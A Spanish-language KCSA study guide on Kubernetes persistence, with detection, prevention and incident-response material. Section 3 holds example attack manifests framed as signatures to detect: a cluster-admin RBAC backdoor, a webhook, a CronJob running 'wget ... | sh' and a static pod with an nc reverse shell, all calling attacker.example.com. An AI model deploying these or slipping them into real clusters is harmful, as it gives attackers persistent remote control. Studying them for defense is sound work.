# 4.2 Persistence — Modelo de Amenazas de Kubernetes

> **Ubicación en el examen KCSA.** Este tópico vive dentro del dominio *Kubernetes Threat Model* (16 %). "Persistence" **no** se refiere a almacenamiento persistente (`PersistentVolume`/`PVC`) sino a la táctica homónima de MITRE ATT&CK: los mecanismos con los que un adversario **retiene acceso** a un cluster comprometido a través de reinicios, rotaciones de credenciales, parches y respuestas a incidentes. Confundir ambos conceptos es el error clásico en este tema.

---

## 1. Motivación y problema arquitectónico de producción

El *initial access* (una credencial filtrada, un RCE en un contenedor, un token de ServiceAccount expuesto) es, por naturaleza, **efímero**: se rota la clave, se parchea el CVE, se reinicia el pod. La táctica de **persistence** convierte ese acceso transitorio en **durabilidad**: el atacante instala un mecanismo que **sobrevive** al evento que lo remedió.

El problema arquitectónico es que Kubernetes es un sistema **declarativo y reconciliante**, y esa misma propiedad que lo hace resiliente para el operador lo hace resiliente **para el atacante**:

- **Controllers que reconcilian.** Un `Deployment`, `DaemonSet` o `CronJob` malicioso es *self-healing*. Borrás el pod y el controller lo recrea. La persistencia no está en el pod, está en el objeto que lo gobierna.
- **Superficie de identidad enorme.** Cada namespace tiene ServiceAccounts; cada SA puede tener tokens; el RBAC es aditivo y difícil de auditar. Un `ClusterRoleBinding` de más pasa desapercibido entre cientos.
- **Múltiples planos de control.** Un objeto puede nacer en el API server (auditable), en el kubelet (static pods, fuera del scheduler) o directamente en **etcd** (sin admission, sin audit). Cada plano es un lugar donde esconderse.
- **Extensibilidad como backdoor.** Los admission webhooks fueron diseñados para mutar/validar todo objeto que entra al cluster. Un `MutatingWebhookConfiguration` malicioso inyecta un sidecar en **cada pod nuevo** — persistencia que se re-materializa sola en workloads legítimos.
- **La frontera nodo/cluster.** Un pod privilegiado con `hostPath` cruza hacia el nodo (systemd, cron, `authorized_keys`, runtime hooks), y desde el nodo la persistencia ya no es un problema de Kubernetes sino de Linux — invisible a `kubectl`.

La regla mental de producción: **el blast radius de la persistencia no se mide por el pod comprometido, sino por el plano de control donde el atacante logró escribir.** Un token robado es contenible; un webhook mutante o una escritura en etcd, no — hasta que se descubre el mecanismo.

Marcos de referencia canónicos que este tema modela: la matriz **MITRE ATT&CK for Containers** (táctica *Persistence*, `TA0003`) y la **Threat Matrix for Kubernetes** de Microsoft.

---

## 2. Comparativa técnica de mecanismos de persistencia

Cada mecanismo se evalúa por: **plano de control** donde vive, **privilegio requerido** para instalarlo, **durabilidad** (¿sobrevive a qué?), **sigilo** (dificultad de detección) y **auto-recuperación**.

| Mecanismo | Plano | Privilegio mínimo | Durabilidad | Sigilo | Self-healing |
|---|---|---|---|---|---|
| **ClusterRoleBinding backdoor** | API/RBAC | `bind`/`escalate` sobre roles, o create RBAC | Sobrevive a rotación de token del SA | Bajo — visible en `get clusterrolebindings` | No, pero re-usable |
| **Token de larga vida (Secret SA manual)** | API/Secrets | `create secrets` en un ns | Sobrevive a reinicios; **no expira** | Medio | No |
| **CronJob malicioso** | API/Workloads | `create cronjobs` | Re-ejecuta según schedule | Medio | Sí (recrea Job) |
| **DaemonSet/Deployment backdoor** | API/Workloads | `create` workloads | Sobrevive a borrado de pods | Bajo-Medio | Sí |
| **MutatingWebhook (shadow)** | Admission | `create mutatingwebhookconfigurations` (cluster-scope) | Inyecta en **cada pod nuevo** | **Alto** | Sí (efecto global) |
| **Static pod** | Kubelet/Nodo | Escritura en `/etc/kubernetes/manifests` (acceso al nodo) | Sobrevive a reinicio de kubelet y a `kubectl delete` | **Alto** — mirror pod sin owner | Sí (kubelet lo recrea) |
| **Persistencia en el nodo** (systemd, cron, SSH, runtime hook) | Nodo/OS | root en el host | Sobrevive a drenaje/recreación de pods | **Muy alto** — fuera de K8s | Sí |
| **Escritura directa en etcd** | etcd | Acceso a etcd (certs/red) | Total; **bypass admission y audit** | **Muy alto** | Depende del objeto |
| **Imagen/registry con backdoor** | Supply chain | Push al registry | Reaparece en cada `pull` | Alto | Sí (imagePullPolicy) |
| **Kubeconfig / client cert de larga vida** | API/Auth | Firmar con la CA del cluster, o CSR aprobado | Cert válido hasta expiración (años) | Alto — no revocable sin rotar CA | No |

**Trade-off del atacante:** cuanto más profundo el plano (etcd, nodo), mayor sigilo y durabilidad, pero mayor privilegio inicial requerido. Los mecanismos de **admission** son el punto óptimo del atacante avanzado: requieren solo permisos cluster-scope sobre un recurso que casi nadie audita, y su efecto es global y auto-recuperante.

**Trade-off del defensor (implicación):** no alcanza con auditar workloads. La detección debe cubrir los **cuatro planos** — API (RBAC/Secrets/webhooks), kubelet (static/mirror pods), etcd (integridad) y nodo (EDR/host).

### 2.1 Tokens: bound vs. legacy (el matiz que evalúa KCSA)

| Propiedad | Bound token (proyectado, TokenRequest API) | Legacy token (Secret manual `kubernetes.io/service-account-token`) |
|---|---|---|
| Expiración | Sí (`expirationSeconds`, típ. 1 h, auto-rotado) | **Nunca** |
| Audience-bound | Sí (`aud`) | No |
| Ligado a la vida del pod | Sí (deja de ser válido al borrar el pod) | No — vale mientras exista el Secret |
| Uso como persistencia | Malo para el atacante | **Excelente** para el atacante |
| Default desde K8s 1.24 | Sí | Ya no se autogenera; hay que crearlo a mano |

Desde Kubernetes 1.24, los Secrets de token **ya no se generan automáticamente** por SA. Que aparezca un Secret de tipo `kubernetes.io/service-account-token` creado a mano es, por sí mismo, una **señal de caza** (hunting signal): alguien está fabricando una credencial que no expira.

---

## 3. Manifiestos completos (para reconocer y para prevenir)

> Los manifiestos de "ataque" se muestran **como firmas a detectar** — son exactamente las formas que un IR debe reconocer. Cada uno va seguido de su control preventivo.

### 3.1 Backdoor RBAC: cluster-admin a un SA propio

```yaml
# firma-rbac-backdoor.yaml  — QUÉ BUSCAR, no qué desplegar
apiVersion: v1
kind: ServiceAccount
metadata:
  name: metrics-exporter          # nombre benigno para camuflarse
  namespace: kube-system          # ns ruidoso donde nadie mira
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system:metrics-exporter   # prefijo "system:" para parecer nativo
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin             # ⚠️ escalada total
subjects:
- kind: ServiceAccount
  name: metrics-exporter
  namespace: kube-system
---
apiVersion: v1
kind: Secret                       # token que NO expira (persistencia)
metadata:
  name: metrics-exporter-token
  namespace: kube-system
  annotations:
    kubernetes.io/service-account.name: metrics-exporter
type: kubernetes.io/service-account-token
```

**Señales:** `ClusterRoleBinding` a `cluster-admin` con sujeto SA; prefijo `system:` no nativo; Secret de token creado manualmente en 1.24+.

### 3.2 Shadow MutatingWebhook: inyecta un sidecar en cada pod

```yaml
# firma-shadow-webhook.yaml — el mecanismo de persistencia global
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: sidecar-injector          # suena legítimo (istio-like)
webhooks:
- name: inject.sidecar.local
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore           # ⚠️ si el webhook cae, no rompe el cluster → sigilo
  reinvocationPolicy: IfNeeded
  clientConfig:
    url: https://attacker.example.com/mutate   # ⚠️ endpoint externo
    caBundle: <base64-ca>
  rules:
  - apiGroups: [""]
    apiVersions: ["v1"]
    operations: ["CREATE"]
    resources: ["pods"]
    scope: "*"
  namespaceSelector:              # excluye kube-system para no romper el arranque
    matchExpressions:
    - key: kubernetes.io/metadata.name
      operator: NotIn
      values: ["kube-system"]
```

**Señales:** `clientConfig.url` externo (los legítimos usan `service:`); `failurePolicy: Ignore` en un webhook desconocido; `MutatingWebhookConfiguration` que no pertenece a ningún operator instalado.

### 3.3 CronJob de re-establecimiento (reverse shell periódica)

```yaml
# firma-cronjob-persistence.yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: log-rotator              # nombre inocuo
  namespace: kube-system
spec:
  schedule: "*/30 * * * *"       # cada 30 min re-establece el acceso
  concurrencyPolicy: Forbid
  jobTemplate:
    spec:
      backoffLimit: 0
      template:
        spec:
          restartPolicy: Never
          serviceAccountName: metrics-exporter   # reutiliza el backdoor RBAC
          containers:
          - name: rotate
            image: busybox:1.36
            command: ["/bin/sh","-c"]
            args:
            - "wget -qO- https://attacker.example.com/beacon | sh"   # ⚠️ ejecución remota
```

**Señales:** CronJobs que ejecutan `sh -c` con `curl`/`wget` a hosts externos; workloads con `serviceAccountName` de alto privilegio.

### 3.4 Static pod (persistencia a nivel kubelet)

```yaml
# /etc/kubernetes/manifests/kube-proxy-metrics.yaml  ← escrito en el NODO
apiVersion: v1
kind: Pod
metadata:
  name: kube-proxy-metrics
  namespace: kube-system
spec:
  hostNetwork: true
  hostPID: true                  # ⚠️ visibilidad total de procesos del host
  containers:
  - name: shell
    image: busybox:1.36
    command: ["/bin/sh","-c","while true; do nc attacker.example.com 4444 -e /bin/sh; sleep 60; done"]
    securityContext:
      privileged: true           # ⚠️
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath: { path: / }        # ⚠️ raíz del host montada
```

**Señales:** el kubelet crea un **mirror pod** visible en el API server pero **sin `ownerReferences`** y con anotación `kubernetes.io/config.source: file`. No se puede borrar con `kubectl delete` — el kubelet lo recrea. La cura es borrar el archivo en el nodo.

### 3.5 Control preventivo — Kyverno: prohibir webhooks y RBAC peligrosos

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-persistence-vectors
spec:
  validationFailureAction: Enforce
  background: true
  rules:
  - name: no-external-webhook-url
    match:
      any:
      - resources:
          kinds: ["MutatingWebhookConfiguration","ValidatingWebhookConfiguration"]
    validate:
      message: "Webhooks must target an in-cluster Service, not an external URL."
      foreach:
      - list: "request.object.webhooks"
        deny:
          conditions:
            any:
            - key: "{{ element.clientConfig.url || '' }}"
              operator: NotEquals
              value: ""
  - name: no-cluster-admin-binding
    match:
      any:
      - resources:
          kinds: ["ClusterRoleBinding"]
    validate:
      message: "Binding to cluster-admin is forbidden by policy."
      deny:
        conditions:
          all:
          - key: "{{ request.object.roleRef.name }}"
            operator: Equals
            value: "cluster-admin"
  - name: no-manual-sa-token-secret
    match:
      any:
      - resources:
          kinds: ["Secret"]
    validate:
      message: "Manual service-account-token Secrets are forbidden (use TokenRequest)."
      deny:
        conditions:
          all:
          - key: "{{ request.object.type }}"
            operator: Equals
            value: "kubernetes.io/service-account-token"
```

### 3.6 Control preventivo nativo — ValidatingAdmissionPolicy (sin webhook externo)

Ventaja defensiva clave: al ser **in-tree** (CEL, evaluado por el API server), no depende de un webhook que el atacante pueda deshabilitar.

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: deny-privileged-hostpath
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
    - apiGroups: [""]
      apiVersions: ["v1"]
      operations: ["CREATE","UPDATE"]
      resources: ["pods"]
  validations:
  - expression: >
      !object.spec.containers.exists(c,
        has(c.securityContext) && c.securityContext.privileged == true)
    message: "Privileged containers are not allowed."
  - expression: >
      !has(object.spec.volumes) ||
      !object.spec.volumes.exists(v, has(v.hostPath))
    message: "hostPath volumes are not allowed."
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: deny-privileged-hostpath-binding
spec:
  policyName: deny-privileged-hostpath
  validationActions: ["Deny"]
  matchResources:
    namespaceSelector:
      matchExpressions:
      - key: kubernetes.io/metadata.name
        operator: NotIn
        values: ["kube-system"]
```

### 3.7 Detección — regla Falco para persistencia

```yaml
# falco_persistence_rules.yaml
- rule: Manual ServiceAccount Token Secret Created
  desc: A service-account-token Secret was created via the API (non-expiring token).
  condition: >
    kevt and ka.verb=create and ka.target.resource=secrets
    and ka.req.secret.type="kubernetes.io/service-account-token"
  output: >
    Manual SA token secret created (user=%ka.user.name ns=%ka.target.namespace
    name=%ka.target.name)
  priority: WARNING
  source: k8s_audit
  tags: [persistence, mitre_persistence]

- rule: New MutatingWebhook With External Endpoint
  desc: A mutating webhook was configured to call an external URL.
  condition: >
    kevt and ka.verb in (create,update)
    and ka.target.resource=mutatingwebhookconfigurations
    and ka.req.webhook.client_config.url exists
  output: >
    External mutating webhook created (user=%ka.user.name name=%ka.target.name)
  priority: CRITICAL
  source: k8s_audit
  tags: [persistence, admission_control]

- rule: Static Pod Manifest Written On Node
  desc: A file was written under the kubelet static pod directory.
  condition: >
    open_write and fd.directory="/etc/kubernetes/manifests"
    and not proc.name in (kubeadm, kubelet)
  output: >
    Static pod manifest written (file=%fd.name proc=%proc.cmdline user=%user.name)
  priority: CRITICAL
  tags: [persistence, node]
```

### 3.8 Endurecer el audit log (sin él no hay detección en el plano API)

```yaml
# /etc/kubernetes/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
omitStages: ["RequestReceived"]
rules:
- level: RequestResponse
  resources:
  - group: "rbac.authorization.k8s.io"
    resources: ["clusterrolebindings","rolebindings","clusterroles","roles"]
  - group: "admissionregistration.k8s.io"
    resources: ["mutatingwebhookconfigurations","validatingwebhookconfigurations"]
- level: Metadata
  resources:
  - group: ""
    resources: ["secrets","serviceaccounts"]
- level: RequestResponse
  resources:
  - group: "batch"
    resources: ["cronjobs","jobs"]
- level: Metadata
  omitStages: ["RequestReceived"]
```

Y el `kube-apiserver` debe arrancar con:

```
--audit-policy-file=/etc/kubernetes/audit-policy.yaml
--audit-log-path=/var/log/kubernetes/audit.log
--audit-log-maxage=30 --audit-log-maxbackup=10 --audit-log-maxsize=100
```

---

## 4. Comandos CLI y salidas reales

### 4.1 Enumerar bindings de alto privilegio

```console
$ kubectl get clusterrolebindings -o json \
  | jq -r '.items[] | select(.roleRef.name=="cluster-admin")
           | "\(.metadata.name)\t\(.subjects[]?.kind)/\(.subjects[]?.name)"'
cluster-admin                     Group/system:masters
system:metrics-exporter           ServiceAccount/metrics-exporter
```

> `cluster-admin → Group/system:masters` es legítimo (el default). `system:metrics-exporter` **no lo es** — un SA con cluster-admin es la firma del backdoor de la §3.1.

### 4.2 Verificar qué puede hacer un SA sospechoso

```console
$ kubectl auth can-i --list \
  --as=system:serviceaccount:kube-system:metrics-exporter
Resources                     Non-Resource URLs   Resource Names   Verbs
*.*                           []                  []               [*]
                              [*]                 []               [*]
```

> `*.*` con verbo `[*]`: acceso total. Un exporter de métricas nunca necesita eso.

### 4.3 Cazar tokens de larga vida (creados a mano)

```console
$ kubectl get secrets -A --field-selector type=kubernetes.io/service-account-token \
  -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,SA:.metadata.annotations.kubernetes\.io/service-account\.name'
NS            NAME                        SA
kube-system   metrics-exporter-token      metrics-exporter
```

> En un cluster 1.24+, esta lista debería estar **prácticamente vacía**. Cada entrada es un token que no expira.

### 4.4 Detectar webhooks mutantes con endpoint externo

```console
$ kubectl get mutatingwebhookconfigurations \
  -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.webhooks[*].clientConfig.url}{"\n"}{end}'
istio-sidecar-injector	
sidecar-injector	https://attacker.example.com/mutate
```

> El primero usa `service:` (columna vacía = interno, correcto). El segundo apunta a una **URL externa** — firma de la §3.2.

### 4.5 Encontrar static/mirror pods (sin owner, source=file)

```console
$ kubectl get pods -A -o json | jq -r '
  .items[] | select(.metadata.annotations["kubernetes.io/config.source"]=="file")
  | "\(.metadata.namespace)/\(.metadata.name)\towner=\(.metadata.ownerReferences // "none")"'
kube-system/kube-apiserver-cp1        owner=[{"apiVersion":"v1","kind":"Node",...}]
kube-system/kube-proxy-metrics-w2     owner=none
```

> Los componentes del control plane (`kube-apiserver-*`, `etcd-*`) son static pods legítimos. `kube-proxy-metrics-w2` con `owner=none` y nombre imitativo es el intruso de la §3.4.

Confirmación en el nodo:

```console
$ ssh worker-2 'ls -la /etc/kubernetes/manifests/'
total 12
drwxr-xr-x 2 root root 4096 Aug  7 03:14 .
-rw------- 1 root root  842 Aug  7 03:14 kube-proxy-metrics.yaml   # ⚠️ no debería estar acá

$ ssh worker-2 'sudo crictl ps --name shell'
CONTAINER      IMAGE          CREATED         STATE     NAME    POD
9f3ac1b0d2e17  busybox:1.36   4 minutes ago   Running   shell   kube-proxy-metrics-w2
```

### 4.6 Auditar CronJobs sospechosos

```console
$ kubectl get cronjobs -A -o json | jq -r '
  .items[] | .spec.jobTemplate.spec.template.spec.containers[] as $c
  | select($c.args // [] | join(" ") | test("curl|wget|nc |/bin/sh"))
  | "\(.metadata.namespace)/\(.metadata.name)\t\($c.image)\t\($c.args|join(" "))"'
kube-system/log-rotator   busybox:1.36   /bin/sh -c wget -qO- https://attacker.example.com/beacon | sh
```

### 4.7 Rastrear en el audit log quién lo creó

```console
$ jq -r 'select(.objectRef.resource=="clusterrolebindings" and .verb=="create")
         | "\(.stageTimestamp)\t\(.user.username)\t\(.objectRef.name)"' \
     /var/log/kubernetes/audit.log
2026-08-07T03:12:44Z   system:serviceaccount:default:ci-deployer   system:metrics-exporter
```

> El backdoor lo creó `ci-deployer` — pivotá la investigación hacia esa credencial de CI (probable initial access).

---

## 5. Guía de verificación y diagnóstico de fallas

### 5.1 Checklist de hunting por plano de control

**Plano API / RBAC**
- [ ] `ClusterRoleBinding`/`RoleBinding` hacia `cluster-admin` o ClusterRoles con `*` en verbos/recursos.
- [ ] SAs con permisos `create`/`update` sobre `*.rbac.authorization.k8s.io` (auto-escalada).
- [ ] Verbos peligrosos `bind`, `escalate`, `impersonate` concedidos fuera de componentes del sistema.
- [ ] Secrets de tipo `service-account-token` creados manualmente (§4.3).

**Plano Admission**
- [ ] `Mutating/ValidatingWebhookConfiguration` no mapeados a un operator conocido.
- [ ] `clientConfig.url` externo o `failurePolicy: Ignore` en webhooks desconocidos.

**Plano Kubelet**
- [ ] Pods con `config.source=file` y `ownerReferences: none` que **no** sean control-plane (§4.5).
- [ ] Contenido de `/etc/kubernetes/manifests/` en cada nodo comparado contra un baseline conocido.

**Plano etcd / Nodo**
- [ ] Integridad de etcd: objetos presentes en etcd pero ausentes en el audit log (creados fuera de banda).
- [ ] Host: `systemctl list-units`, `crontab -l`, `~/.ssh/authorized_keys`, hooks del runtime (OCI `prestart`), unidades systemd nuevas.

### 5.2 Matriz de diagnóstico de fallas

| Síntoma observado | Causa probable | Confirmación | Remediación |
|---|---|---|---|
| Un pod "reaparece" tras `kubectl delete` | Controller (Deployment/DS/CronJob) o **static pod** | `kubectl get <pod> -o yaml \| grep ownerReferences` | Borrar el objeto padre; si es static, borrar el archivo en el nodo |
| Todos los pods nuevos traen un sidecar raro | **MutatingWebhook** malicioso | `kubectl get mutatingwebhookconfigurations` (§4.4) | Borrar la webhook config; rotar workloads inyectados |
| Token que "no muere" tras borrar el pod | Legacy token en Secret manual | §4.3 | Borrar el Secret; migrar a TokenRequest/projected |
| Acceso admin que persiste tras revocar una clave | ClusterRoleBinding backdoor | §4.1 / audit (§4.7) | Borrar el binding; auditar el creador |
| Objeto existe pero no hay evento de creación | Escritura directa en **etcd** | Diff API ↔ audit log | Restaurar etcd desde backup limpio; rotar la CA |
| Cert de cliente admin que sigue autenticando | Kubeconfig/CSR de larga vida firmado con la CA | `kubectl get csr`; inspeccionar certs | **Rotar la CA del cluster** (no hay revocación de certs en K8s) |
| Contenedor con reverse shell en un nodo, invisible al scheduler | Static pod / persistencia en el host | §4.5 + `crictl ps` en el nodo | Cordon+drain, borrar archivo, reimagen del nodo |

### 5.3 Verificar que los controles preventivos están **activos** (no solo instalados)

```console
$ kubectl get validatingadmissionpolicybindings
NAME                              POLICYNAME                  VALIDATIONACTIONS
deny-privileged-hostpath-binding  deny-privileged-hostpath    ["Deny"]

$ kubectl run t --image=busybox --privileged --restart=Never --command -- sleep 1
Error from server (Forbidden): admission webhook policy denied the request:
Privileged containers are not allowed.
```

> Un control que no rechaza un caso de prueba **no está protegiendo nada**. Verificá siempre con un intento real, no con `get`.

Confirmar que el audit log realmente registra:

```console
$ kubectl create clusterrolebinding test-audit --clusterrole=view \
    --serviceaccount=default:default
clusterrolebinding.rbac.authorization.k8s.io/test-audit created
$ tail -n1 /var/log/kubernetes/audit.log | jq -r '.objectRef.name'
test-audit
$ kubectl delete clusterrolebinding test-audit
```

> Si no aparece la línea, la política de auditoría no cubre RBAC — un ciego total en el plano donde vive el backdoor más común.

### 5.4 Principio de erradicación

La persistencia rara vez es un solo objeto. El orden correcto de respuesta:

1. **Contener** el initial access (rotar la credencial que lo creó — la del audit log).
2. **Enumerar los cuatro planos** antes de borrar nada (el atacante suele dejar mecanismos redundantes).
3. **Erradicar de afuera hacia adentro:** primero API (RBAC/webhooks/secrets), luego kubelet (static pods), luego etcd/nodo.
4. **Rotar lo no revocable:** tokens de SA, y si hay sospecha de acceso a la CA o a etcd, **rotar la CA** — es la única forma de invalidar client certs de larga vida.
5. **Re-verificar** con los tests de la §5.3 y con un nuevo barrido de hunting: la ausencia de hallazgos solo prueba que los vectores *escaneados* están limpios.

---

## 6. Referencias

- **KCSA Curriculum (CNCF)** — dominio *Kubernetes Threat Model*: https://github.com/cncf/curriculum
- **MITRE ATT&CK for Containers — táctica Persistence (TA0003)**: https://attack.mitre.org/matrices/enterprise/containers/
- **Threat Matrix for Kubernetes (Microsoft)**: https://microsoft.github.io/Threat-Matrix-for-Kubernetes/
- **Static Pods (kubelet)**: https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/
- **Dynamic Admission Control (webhooks)**: https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/
- **Validating Admission Policy (CEL, in-tree)**: https://kubernetes.io/docs/reference/access-authn-authz/validating-admission-policy/
- **RBAC — Using RBAC Authorization**: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
- **Managing Service Accounts / tokens (TokenRequest, legacy)**: https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/
- **Auditing**: https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- **PKI certificates and requirements (rotación de CA)**: https://kubernetes.io/docs/setup/best-practices/certificates/
- **Falco — Kubernetes audit rules**: https://falco.org/docs/reference/rules/
- **Kyverno — Policies**: https://kyverno.io/docs/
- **OPA Gatekeeper**: https://open-policy-agent.github.io/gatekeeper/website/docs/
- **CNCF — Kubernetes Hardening / cloud native security**: https://kubernetes.io/docs/concepts/security/